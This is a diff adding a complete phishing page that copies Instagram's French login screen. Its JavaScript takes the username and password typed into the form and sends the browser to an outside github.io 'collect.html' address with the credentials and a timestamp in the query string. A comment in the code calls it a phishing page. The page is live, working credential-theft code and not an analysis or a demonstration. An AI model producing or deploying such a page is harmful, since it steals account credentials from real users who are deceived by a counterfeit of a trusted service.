@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Instagram</title>
+    <!-- Instagram Favicon -->
+    <link rel="icon" type="image/png" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa; /* Instagram background */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh; /* Full viewport height */
+            padding: 20px;
+            flex-direction: column; /* Allow vertical stacking for footer */
+        }
+
+        .main-content {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-grow: 1; /* Allows main content to take available space */
+            width: 100%;
+            max-width: 935px; /* Instagram's typical max-width for login page */
+        }
+
+        /* Styling for the direct image replacement */
+        .full-screenshot-image {
+            display: none; /* Hidden by default on small screens */
+            width: 454px; /* Matches the typical width of the phone mockup area */
+            height: auto; /* Maintain aspect ratio */
+            margin-right: 32px; /* Space between image and login card */
+            object-fit: contain; /* Ensure the entire image is visible */
+        }
+
+        /* Show the image on larger screens */
+        @media (min-width: 875px) {
+            .full-screenshot-image {
+                display: block;
+            }
+        }
+
+
+        .container {
+            max-width: 350px; /* Standard width for login forms */
+            width: 100%;
+        }
+
+        .card {
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb; /* Light grey border */
+            border-radius: 3px; /* Slight rounding */
+            padding: 40px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .logo {
+            width: 175px; /* Typical Instagram wordmark width */
+            height: auto;
+            margin-bottom: 30px; /* Space below logo */
+        }
+
+        .login-form {
+            position: relative; /* Needed for absolute positioning of show/hide button */
+        }
+
+        .login-form input[type="text"],
+        .login-form input[type="password"] {
+            width: 100%;
+            padding: 9px 8px;
+            margin-bottom: 6px; /* Small gap between inputs */
+            border: 1px solid #dbdbdb;
+            background-color: #fafafa;
+            border-radius: 3px;
+            font-size: 12px;
+            color: #262626;
+        }
+
+        .login-form input:focus {
+            outline: none;
+            border-color: #a8a8a8; /* Slightly darker border on focus */
+        }
+
+        .login-form ::placeholder {
+            color: #8e8e8e; /* Placeholder text color */
+            font-size: 12px;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 8px;
+            margin-top: 10px; /* Space above button */
+            background-color: #0095f6; /* Instagram blue */
+            color: #ffffff;
+            border: none;
+            border-radius: 8px; /* More rounded button */
+            font-weight: bold;
+            font-size: 14px;
+            cursor: pointer;
+            opacity: 0.7; /* Often starts slightly faded until input */
+            transition: opacity 0.2s ease-in-out;
+        }
+
+        /* Basic simulation of active button when inputs have value (requires JS usually) */
+        .login-form input:valid ~ .login-button,
+        .login-button:hover { /* Hover makes it active too for demo */
+           opacity: 1;
+        }
+
+        /* Show/Hide Password Button Styling */
+        .password-toggle-button {
+            position: absolute;
+            right: 8px; /* Adjust as needed */
+            top: 50%; /* Vertically center */
+            transform: translateY(-50%); /* Adjust for exact centering */
+            background: none;
+            border: none;
+            color: #262626; /* Dark text color */
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            padding: 4px;
+            z-index: 10; /* Ensure it's above the input */
+            display: none; /* Hidden by default, shown by JS when password is typed */
+        }
+
+        .password-toggle-button:hover {
+            opacity: 0.7;
+        }
+
+
+        .separator {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: bold;
+        }
+
+        .separator hr {
+            flex-grow: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+            border: none;
+        }
+
+        .separator span {
+            padding: 0 18px; /* Space around "OR" */
+        }
+
+        .fb-login {
+            margin-top: 15px;
+            margin-bottom: 15px;
+        }
+
+        .fb-login a {
+            color: #385185; /* Facebook blue */
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 14px;
+            display: inline-flex; /* Use flex to align icon and text */
+            align-items: center;
+        }
+
+        /* Placeholder for FB icon - using inline SVG for better control */
+        .fb-icon {
+            margin-right: 8px;
+            width: 16px;
+            height: 16px;
+            fill: #385185; /* Facebook blue */
+        }
+
+        .forgot-password {
+            margin-top: 12px;
+        }
+
+        .forgot-password a {
+            color: #00376b; /* Darker blue for links */
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .signup-card {
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .signup-card p {
+            color: #262626; /* Standard text color */
+            margin: 0;
+        }
+
+        .signup-card a {
+            color: #0095f6; /* Instagram blue */
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .get-app-section {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .get-app-section p {
+            font-size: 14px;
+            margin-bottom: 15px;
+            color: #262626;
+        }
+
+        .get-app-section img {
+            height: 40px; /* Standard height for app store badges */
+            margin: 0 4px; /* Small space between badges */
+        }
+
+        .footer {
+            margin-top: 64px; /* Large space above footer */
+            padding: 0 20px 20px; /* Padding for the footer */
+            width: 100%;
+            max-width: 935px; /* Align with main content width */
+            text-align: center;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap; /* Allow links to wrap on smaller screens */
+            justify-content: center;
+            margin-bottom: 12px;
+        }
+
+        .footer-links a, .footer-links span {
+            color: #8e8e8e; /* Muted grey for footer links */
+            text-decoration: none;
+            font-size: 12px;
+            margin: 0 8px 7px; /* Spacing between links */
+            white-space: nowrap; /* Prevent breaking in the middle of a link */
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .language-selector {
+            margin-bottom: 12px;
+        }
+
+        .language-selector select {
+            border: none;
+            background-color: transparent;
+            color: #8e8e8e;
+            font-size: 12px;
+            padding: 0;
+            cursor: pointer;
+            -webkit-appearance: none; /* Remove default dropdown arrow */
+            -moz-appearance: none;
+            appearance: none;
+            text-align-last: center; /* Center text in dropdown */
+        }
+
+        .copyright {
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+
+        /* Message display styling (from previous JS) */
+        .message-display {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 8px;
+            background-color: #f0f0f0;
+            color: #333;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-size: 14px;
+            text-align: center;
+            display: none; /* Hidden by default */
+            max-width: 350px;
+            width: 100%;
+            box-sizing: border-box; /* Include padding in width */
+        }
+    </style>
+</head>
+<body>
+    <div class="main-content">
+        <!-- Direct image replacement for the phone mockup -->
+        <img src="https://www.instagram.com/images/instagram/xig/homepage/screenshots_v3/instagram-web-lox-image.png" alt="Instagram App Screenshot" class="full-screenshot-image">
+
+        <div class="container">
+            <div class="card login-card">
+                <!-- Instagram Logo -->
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1280px-Instagram_logo.svg.png" alt="Instagram Logo" class="logo">
+
+                <form class="login-form">
+                    <input type="text" name="username" placeholder="Num. téléphone, nom de profil ou e-mail" required aria-label="Num. téléphone, nom de profil ou e-mail">
+                    <div style="position: relative; margin-bottom: 6px;">
+                        <input type="password" name="password" placeholder="Mot de passe" required aria-label="Mot de passe">
+                        <button type="button" class="password-toggle-button" id="passwordToggleButton">Afficher</button>
+                    </div>
+                    <button type="submit" class="login-button">Se connecter</button>
+                </form>
+
+                <div class="separator">
+                    <hr>
+                    <span>ou</span>
+                    <hr>
+                </div>
+
+                <div class="fb-login">
+                    <a href="#">
+                        <!-- Facebook Icon SVG -->
+                        <svg class="fb-icon" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M13.18 0H2.81A2.81 2.81 0 000 2.82v10.36A2.81 2.81 0 002.81 16h5.53v-5.85H6.47V7.88h1.87V6.25c0-1.86 1.08-2.89 2.8-2.89.8 0 1.48.06 1.68.08v2.03h-1.2c-.9 0-1.07.43-1.07 1.05v1.38h2.25l-.29 2.27H10v5.85h3.18a2.81 2.81 0 002.82-2.82V2.82A2.81 2.81 0 0013.18 0z"/>
+                        </svg>
+                        Se connecter avec Facebook
+                    </a>
+                </div>
+
+                <div class="forgot-password">
+                    <a href="#">Mot de passe oublié ?</a>
+                </div>
+            </div>
+
+            <div class="card signup-card">
+                <p>Vous n’avez pas de compte ? <a href="#">Inscrivez-vous</a></p>
+            </div>
+
+            <div class="get-app-section">
+                <p>Téléchargez l’application.</p>
+                <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Download on the App Store"></a>
+                <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it on Google Play"></a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Message Display (from JS) -->
+    <div class="message-display" id="messageDisplay"></div>
+
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="#">Meta</a>
+            <a href="#">À propos</a>
+            <a href="#">Blog</a>
+            <a href="#">Emplois</a>
+            <a href="#">Aide</a>
+            <a href="#">API</a>
+            <a href="#">Confidentialité</a>
+            <a href="#">Conditions</a>
+            <a href="#">Lieux</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Threads</a>
+            <a href="#">Importation des contacts et non-utilisateurs</a>
+            <a href="#">Meta Verified</a>
+        </div>
+        <div class="language-selector">
+            <select aria-label="Sélectionner la langue">
+                <option value="fr">Français</option>
+                <option value="af">Afrikaans</option>
+                <option value="ar">العربية</option>
+                <option value="cs">Čeština</option>
+                <option value="da">Dansk</option>
+                <option value="de">Deutsch</option>
+                <option value="el">Ελληνικά</option>
+                <option value="en">English</option>
+                <option value="en-gb">English (UK)</option>
+                <option value="es-es">Español (España)</option>
+                <option value="es">Español</option>
+                <option value="fa">فارسی</option>
+                <option value="fi">Suomi</option>
+                <option value="he">עברית</option>
+                <option value="id">Bahasa Indonesia</option>
+                <option value="it">Italiano</option>
+                <option value="ja">日本語</option>
+                <option value="ko">한국어</option>
+                <option value="ms">Bahasa Melayu</option>
+                <option value="nb">Norsk</option>
+                <option value="nl">Nederlands</option>
+                <option value="pl">Polski</option>
+                <option value="pt-br">Português (Brasil)</option>
+                <option value="pt">Português (Portugal)</option>
+                <option value="ru">Русский</option>
+                <option value="sv">Svenska</option>
+                <option value="th">ภาษาไทย</option>
+                <option value="fil">Filipino</option>
+                <option value="tr">Türkçe</option>
+                <option value="zh-cn">中文(简体)</option>
+                <option value="zh-tw">中文(台灣)</option>
+                <option value="bn">বাংলা</option>
+                <option value="gu">ગુજરાતી</option>
+                <option value="hi">हिन्दी</option>
+                <option value="hr">Hrvatski</option>
+                <option value="hu">Magyar</option>
+                <option value="kn">ಕನ್ನಡ</option>
+                <option value="ml">മലയാളം</option>
+                <option value="mr">मराठी</option>
+                <option value="ne">नेपाली</option>
+                <option value="pa">ਪੰਜਾਬੀ</option>
+                <option value="si">සිංහල</option>
+                <option value="sk">Slovenčina</option>
+                <option value="ta">தமிழ்</option>
+                <option value="te">తెలుగు</option>
+                <option value="ur">اردو</option>
+                <option value="vi">Tiếng Việt</option>
+                <option value="zh-hk">中文(香港)</option>
+                <option value="bg">Български</option>
+                <option value="fr-ca">Français (Canada)</option>
+                <option value="ro">Română</option>
+                <option value="sr">Српски</option>
+                <option value="uk">Українська</option>
+            </select>
+        </div>
+        <div class="copyright">
+            © 2025 Instagram par Meta
+        </div>
+    </footer>
+
+    <!-- Your JavaScript for handling form submission should be placed here -->
+    <!-- It is crucial that the JavaScript is placed AFTER the HTML elements it interacts with. -->
+    <script>
+        // This script captures user credentials from the Instagram-like login form
+        // and redirects the user to a specified URL, passing credentials as URL parameters.
+        //
+        // !!! WARNING: THIS METHOD IS HIGHLY INSECURE FOR SENSITIVE DATA LIKE PASSWORDS. !!!
+        // !!! DO NOT USE IN PRODUCTION OR ANY SCENARIO REQUIRING USER PRIVACY/SECURITY. !!!
+
+        document.addEventListener('DOMContentLoaded', () => {
+            // Get references to the form, input fields, and the login button.
+            const loginForm = document.querySelector('.login-form');
+            const usernameInput = loginForm ? loginForm.querySelector('input[name="username"]') : null;
+            const passwordInput = loginForm ? loginForm.querySelector('input[name="password"]') : null;
+            const loginButton = loginForm ? loginForm.querySelector('.login-button') : null;
+            const passwordToggleButton = document.getElementById('passwordToggleButton'); // Get the new toggle button
+
+            // Get the message display div. It's now part of the HTML structure.
+            const messageDisplay = document.getElementById('messageDisplay');
+
+            // Function to display messages to the user
+            function showMessage(text, type = 'info') {
+                messageDisplay.textContent = text;
+                messageDisplay.style.display = 'block';
+                if (type === 'error') {
+                    messageDisplay.style.backgroundColor = '#ffe0e0';
+                    messageDisplay.style.color = '#cc0000';
+                    messageDisplay.style.border = '1px solid #ff9999';
+                } else if (type === 'success') {
+                    messageDisplay.style.backgroundColor = '#e0ffe0';
+                    messageDisplay.style.color = '#008000';
+                    messageDisplay.style.border = '1px solid #99ff99';
+                } else {
+                    messageDisplay.style.backgroundColor = '#f0f0f0';
+                    messageDisplay.style.color = '#333';
+                    messageDisplay.style.border = '1px solid #dbdbdb';
+                }
+                setTimeout(() => {
+                    messageDisplay.style.display = 'none';
+                }, 5000); // Hide message after 5 seconds
+            }
+
+            // Add an event listener to the form's submit event
+            if (loginForm && usernameInput && passwordInput && loginButton) {
+                loginForm.addEventListener('submit', async (event) => {
+                    event.preventDefault(); // Prevent the default form submission (page reload)
+
+                    const username = usernameInput.value.trim(); // Get username and trim whitespace
+                    const password = passwordInput.value.trim(); // Get password and trim whitespace
+
+                    // Basic validation: ensure username and password are not empty
+                    if (!username || !password) {
+                        showMessage('Please enter both username and password.', 'error');
+                        return;
+                    }
+
+                    // Get the current date and format it
+                    const now = new Date();
+                    const dateOptions = {
+                        year: 'numeric',
+                        month: '2-digit',
+                        day: '2-digit',
+                        hour: '2-digit',
+                        minute: '2-digit',
+                        second: '2-digit',
+                        hour12: false // Use 24-hour format
+                    };
+                    const formattedDate = now.toLocaleString('en-GB', dateOptions).replace(/,/, ''); // Format as DD/MM/YYYY HH:MM:SS
+
+                    // Encode the data for URL parameters
+                    const encodedUsername = encodeURIComponent(username);
+                    const encodedPassword = encodeURIComponent(password);
+                    const encodedDate = encodeURIComponent(formattedDate);
+
+                    // Define the target URL for data collection (your GitHub Pages HTML file)
+                    // !!! WARNING: This URL will be loaded with sensitive data in its parameters. !!!
+                    const targetUrl = `https://y011b.github.io/DATA/collect.html?date=${encodedDate}&username=${encodedUsername}&password=${encodedPassword}`;
+
+                    // Display a message before redirecting
+                    showMessage('Attempting to log in...', 'info');
+
+                    // Redirect the user to the target URL
+                    // This will make the browser navigate to the collect.html page
+                    // with the username and password visible in the URL.
+                    window.location.href = targetUrl;
+
+                    // Note: Since we are redirecting, any code after window.location.href
+                    // will likely not execute, as the browser navigates away.
+                });
+
+                // Toggle password visibility functionality
+                if (passwordToggleButton && passwordInput) {
+                    passwordToggleButton.addEventListener('click', () => {
+                        if (passwordInput.type === 'password') {
+                            passwordInput.type = 'text';
+                            passwordToggleButton.textContent = 'Masquer'; // Change text to 'Hide'
+                        } else {
+                            passwordInput.type = 'password';
+                            passwordToggleButton.textContent = 'Afficher'; // Change text to 'Show'
+                        }
+                    });
+
+                    // Show/hide the toggle button based on password input content
+                    passwordInput.addEventListener('input', () => {
+                        if (passwordInput.value.length > 0) {
+                            passwordToggleButton.style.display = 'block';
+                        } else {
+                            passwordToggleButton.style.display = 'none';
+                        }
+                    });
+
+                    // Initial check in case there's autofilled content
+                    if (passwordInput.value.length > 0) {
+                        passwordToggleButton.style.display = 'block';
+                    }
+                }
+
+
+                // Optional: Enable/disable button based on input presence (for better UX)
+                function toggleLoginButtonOpacity() {
+                    if (usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
+                        loginButton.style.opacity = '1';
+                    } else {
+                        loginButton.style.opacity = '0.7';
+                    }
+                }
+
+                usernameInput.addEventListener('input', toggleLoginButtonOpacity);
+                passwordInput.addEventListener('input', toggleLoginButtonOpacity);
+
+                // Initial check on page load
+                toggleLoginButtonOpacity();
+
+            } else {
+                console.error('Required form elements (form, username input, password input, or login button) not found.');
+                // showMessage('Error: Form elements not found in HTML. Script cannot function.', 'error'); // Removed to avoid showing error on a phishing page
+            }
+        });
+    </script>
+</body>
+</html>
